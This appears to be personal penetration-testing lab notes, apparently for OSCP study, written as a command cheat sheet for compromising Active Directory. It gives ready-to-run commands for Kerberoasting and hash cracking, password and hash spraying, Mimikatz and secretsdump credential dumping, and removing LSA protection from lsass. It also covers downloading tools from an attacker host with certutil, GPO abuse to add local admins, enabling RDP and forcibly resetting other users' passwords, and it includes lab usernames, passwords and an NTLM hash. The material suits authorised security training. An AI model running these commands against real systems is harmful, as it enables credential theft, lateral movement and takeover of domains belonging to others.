### ALWAYS CHECK FOR PASSWORD REUSE
### MAKE SURE USERNAMES PWD STORED DONT HAVE EXTRA SPACE

### TRY SPRAYING WITH --LOCAL-AUTH, MAYBE THE CREDS U HAVE MIGHT BE LOCAL ADMIN ON THE AD SET

### ALWAYS CHECK POWERSHELL HISTORY
### TRY DEFAULT PWD FOR ALL SERVICES IN THE AD
### CHECK THE TOOLS VERSION BEFORE USING


#### PS HISTORY USING
```
type C:\Users\administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
### NOTE
```
As a very brief and simple response; once you’re local administrator you should check the root directory(anything non default?) any users present? If so go through each profile n click on the documents, desktop n downloads directory. Check the administrators console_host.txt file. Once you’ve done this, did you dump the credentials on that system(credman, Kerberos ekeys, tickets, lsass)? If you’ve done all of these then you’ll need to spray the passwords/hashes/keys you got on all systems in the domain. You will surly get somewhere. If not, you can go through each compromised user and check their outbound ACLs. What can they do to other objects in the domain? One of these will bubble something of note up guaranteed. You don’t have to think too deeply, remember whenever you’re in the challenge labs n facing a problem; you know a lot more than you think you do
```

## CHECKLIST
- RECURSIVE SEARCH FOR ALL DOCS IN THE USERS FOLDER
- CHECKING CONSOLE HOST FOR ALL USERS ESP ADMIN
- MIMIKATZ CREDS DUMP ( IF DOESNT WORK TRY LSASSY OR SECRETSDUMP)
- CHECK OUTBOUND ACLS
- CHECK INTERESTING GUIDS
- CHECK GPOs
- CHECK FOR PWD REUSE
- SPRAY HASHES AS WELL
- RUN WINPEAS

## ENUMERATION

### SMB ENUMERATION 

```
enum4linux 192.168.162.175 
```
### NET
enumerate all users in the domain
```
net user /domain
```
inspecting specific user permissions
```
net user jeffadmin /domain
```
enumerate groups in a domain
```
net group /domain
```
enumerate a specific group 
```
net group "domain admins" /domain
```

### Enumeration using Powerview

import powerview from the tools folder using 
```
Import-Module .\PowerView.ps1
```
get basic info about the domains
```
Get-NetDomain
```
 The cn attribute holds the username of the user. We can pipe the output into select and choose the cn attribute
```
Get-NetUser | select cn
```
get login info about the users using
```
Get-NetUser | select cn,pwdlastset,lastlogon
```
use **Get-NetGroup** to enumerate groups
```
Get-NetGroup | select cn
```
Enumerating specific groups with PowerView using
```
Get-NetGroup "Domain Admins" | select member
```
cmd to get os and hostname 
```
Get-NetComputer | select operatingsystem,dnshostname
```
get all COMP in the AD
```
Get-NetComputer | Select-Object Name
```
enumerate all domain forests
```
Get-NetForestDomain
```

_Find-LocalAdminAccess_ command scans the network to determine if our current user has administrative permissions on any computers in the domain.
```
Find-LocalAdminAccess
```
find logged in users using (REQUIRES ADMIN RIGHTS)
```
Get-NetSession -ComputerName files04 -Verbose
```
Can get logged on users using 
```
.\PsLoggedon.exe \\files04
```
To enumerate SPNs in the domain, we use setspn.exe
```
setspn -L iis_service 
```

### KERBEROASTING CHECK 
To obtain a clear list of SPNs, we can pipe the output into **select** and choose the **samaccountname** and **serviceprincipalname** attributes
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

To resolve **web04.corp.com** with **nslookup**:
```
nslookup.exe web04.corp.com
```


## Transferring Files
Transferring powerview in PS
```
iwr http://192.168.45.233/powerview.ps1 -OutFile powerview.ps1
```
Transferring powerview in cmd
```
certutil -f -urlcache -split http://192.168.45.233/powerview.ps1  powerview.ps1
```


### KERBEROASTING

We know we can try kerberoasting if we run this command and find a SPN of any user except krbtgt
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
USING WINDOWS
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
 USING KALI
```
 impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john
```
crack the hashes using
```
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
```


### ADDITIONAL INFORMATION
```
hostname
```

```
echo %COMPUTERNAME%
``` 
```
echo %USERDOMAIN%
```

## PASSWORD SPRAYING
#### NXC
```
nxc winrm 10.10.117.152-154 -u usernames -p passwords  
```
```
nxc smb 10.10.117.152-154 -u usernames -p passwords  
```
```
nxc rdp 10.10.117.152-154 -u usernames -p passwords  
```
#### LOCAL AUTH
```
nxc winrm 10.10.117.152-154 -u usernames -p passwords --local-auth
```
```
nxc rdp 10.10.117.152-154 -u usernames -p passwords --local-auth
```
```
crackmapexec winrm 10.10.117.152-154 -u usernames -p passwords --local-auth
```
```
crackmapexec rdp 10.10.117.152-154 -u usernames -p passwords --local-auth
```
#### CME
```
crackmapexec winrm 10.10.117.152-154 -u usernames -p passwords  
```
```
crackmapexec smb 10.10.117.152-154 -u usernames -p passwords  
```
```
crackmapexec rdp 10.10.117.152-154 -u usernames -p passwords  
```
### CMD EXEC USING CME/NXC
cmd to run cmds on a windows ad host using cme
```
crackmapexec winrm 192.168.173.21 -u 'Christopher.Lewis' -p 'P@ssword2022' -x 'whoami'
```
```
nxc winrm 192.168.173.21 -u 'Christopher.Lewis' -p 'P@ssword2022' -x 'whoami'
```

#### Filtering Logon Failures
```
nxc winrm 10.10.117.152-154 -u usernames -p passwords | grep +
```
### Using kerbrute

```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  <PASS>
```

## WINRM CONNECTION
```
evil-winrm -i 192.168.173.21 -u 'Christopher.Lewis' -p 'P@ssword2022'
```

## PSEXEC CONNECTION

- PWD
```
impacket-psexec Administrator@10.10.117.154  
```
- HASHES
```
impacket-psexec tom_admin@10.10.83.146 -hashes :4979d69d4ca66955c075c41cf45f24dc
```
### SILVER TICKET USING LINUX IMPACKET

CMDs to run in windows host 
```
Get-ADdomain
```
get the domain sid
`DomainSID: S-1-5-21-1969309164-1513403977-1686805993`
to get serivce user sid using
```
Get-ADUser -Identity svc_mssql -Properties ServicePrincipalNames, ObjectSID
```
![[Pasted image 20250711210415.png]]
another way is using rpc
```
rpcclient -U "nagoya-industries.com\\Christopher.Lewis%P@ssword2022" 192.168.249.21 
```
and then 
```
enumdomusers
```
run this to get the user sid
```
lookupnames svc_mssql
```
`svc_mssql S-1-5-21-1969309164-1513403977-1686805993-1136 (User: 1)`



### MIMIKATZ COMMANDS

```
privilege::debug                     ; Always run first
sekurlsa::logonpasswords            ; Try to get current logged-in creds
lsadump::sam                        ; Get local user NTLM hashes
lsadump::secrets                    ; Look for service and cached secrets
lsadump::dcsync /domain:x /user:y  ; Dump domain hashes (if possible)
sekurlsa::tickets                   ; Kerberos ticket enumeration
vault::list                         ; Check for vault-stored creds
token::list                         ; List user tokens

```

```
privilege::debug
```
```
token::elevate
```
```
sekurlsa::logonpasswords            
```
```
lsadump::sam                        
```
```
lsadump::secrets                   
```
```
lsadump::dcsync /domain:x /user:y 
```
```
sekurlsa::tickets                  
```
```
vault::list                         
```
```
token::list                         
```
```
sekurlsa::ekeys
```

For Mimikatz, you are in an Evil-winrm shell that has issues when running Mimikatz interactively. You can use the following one-liner: 
```
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit
```

```
.\mimikatz64.exe "privilege::debug" "lsadump::sam /sam:C:\Windows.old\Windows\System32\SAM /system:C:\Windows.old\Windows\System32\SYSTEM" exit
```

if mimikatz doesnt work,

## ALTERNATIVES

### GET A NT AUTH SHELL AND RUN AGAIN
```
# Using PsExec to get SYSTEM shell
.\PsExec64.exe -i -s cmd.exe

# Verify you're running as SYSTEM
whoami
# Should return: NT AUTHORITY\SYSTEM

```

### DUMP SAM AND SYSTEM REGISTRY

```
# Save registry hives
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save  
reg save HKLM\SYSTEM system.save
```

```
# Use secretsdump offline
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

#### **Check for LSA Protection**

Verify if LSA Protection is enabled:

```
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa # Look for RunAsPPL = 0x1 (protection enabled)
```

If LSA Protection is enabled, you may need to use mimikatz with a driver to bypass it:

```
mimikatz # !+ mimikatz # !processprotect /process:lsass.exe /remove mimikatz # sekurlsa::logonpasswords
```

### Switch to Memory-Only Tools
If registry access is blocked, try **lsassy** or **pypykatz** under SYSTEM.

```
lsassy.exe -o csv > creds.csv
```

### LSA Secrets Dumping using nxc


```
nxc smb 192.168.1.100 -u user -p pass --lsa nxc smb 192.168.1.100 -u user -p pass --lsa --local-auth 
```

```
crackmapexec smb 192.168.1.100 -u user -p pass --lsa
```

Dump both SAM and LSA in one command 
```
nxc smb target -u user -p pass --sam --lsa
````

### CRACKING HASHES

#### KERBEROASTING HASH
```
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
```

#### NTLM HASH
```
hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt --force
```



## CHECK GPO PERMISSIONS
```
Get-NetGPO 
```
```
Get-GPPermission
```

#### GPO ABUSE PATH
first we ran
```
Get-NetGPO | select displayname
```
![[Pasted image 20250712165652.png]]
then 
```
Get-GPO -Name "Default Domain Policy"
```
![[Pasted image 20250712165722.png]]
```
Get-GPO -Name "Default Domain Controllers Policy"
```
![[Pasted image 20250712165739.png]]
then to check permissions for domain admin GP
```
Get-GPPermission -Guid 6ac1786c-016f-11d2-945f-00c04fb984f9 -TargetType User -TargetName charlotte
```
![[Pasted image 20250712165833.png]]
and for domain users GP
```
Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName charlotte
```
![[Pasted image 20250712165847.png]]
EDIT POLICY allows us to add a local amdin user and other stuff, so we then trf sharpgpoabuse 
```
certutil -f -urlcache -split http://192.168.45.158/SharpGPOAbuse.exe SharpGPOAbuse.exe
```
then we ran this cmd to add eric wallows to the admin users on DC01,
also you need to use an existing domain user for this to work
```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount Eric.Wallows --GPOName "Default Domain Policy"
```
then to update the GPO, run
```
gpupdate /force
```
and then check administrators 
```
net localgroup administrators
```




## ADDING USER TO RDP 

```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

Allow RDP in the firewall:

```
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

ADDED ERIC.WALLOWS TO LOCAL ADMIN

```
net localgroup administrators "oscp.exam\eric.wallows" /add
```
![[Pasted image 20250721230246.png]]
then i connected using 
```
xfreerdp3 /u:Eric.wallows /p:'EricLikesRunning800' /v:192.168.123.147 /d:oscp.exam
```


## RDP COMMANDS

```
here are reference notes for rdp

1. This will enable the copy paste clipboard

xfreerdp3 /u:siren /p:somepass /v:192.168.180.153 /cert:ignore /clipboard:direction-to:all

2. You can use the following command to track what's on your clipboard :-

xsel --clipboard --output xclip -o

3. Alternatively use CTRL + SHIFT + v, to paste on the terminal.

4. You can also open a text editor on your Kali machine e.g mousepad, and then do CTRL + v, to paste what's on your clip-board.
```



### CHANGING PWD OF ANOTHER USING HAVING GENERICALL
https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/
USING ps
```
Set-ADAccountPassword -Identity <username> -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "<newpassword>" -Force)
```
FOR LOCAL USER
```
Set-LocalUser -Name "<username>" -Password (ConvertTo-SecureString -AsPlainText "<newpassword>" -Force)
```
IN CMD
```
net user <username> <newpassword>
```
```
rpcclient -U "attackeruser" target.domain rpcclient $> setuserinfo2 targetuser 23 "NewPassw0rd!"
```
```
rpcclient -U ignite.local/raj 192.168.1.48
```

```
setuserinfo aarti 23 Password@987
```

using impacket
```
impacket-changepasswd ignite.local/aarti@192.168.1.48 -newpass Password@1234 -altuser ignite.local/raj -altpass Password@1 -reset
```




2. Try mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08 version.




### Enumerating password policies

```
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

```
rpcclient -U "" -N 172.16.5.5
```
and then
```
rpcclient $> querydominfo
```
```
rpcclient $> getdompwinfo
```

```
enum4linux -P 172.16.5.5
```




### USER ENUM

```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```
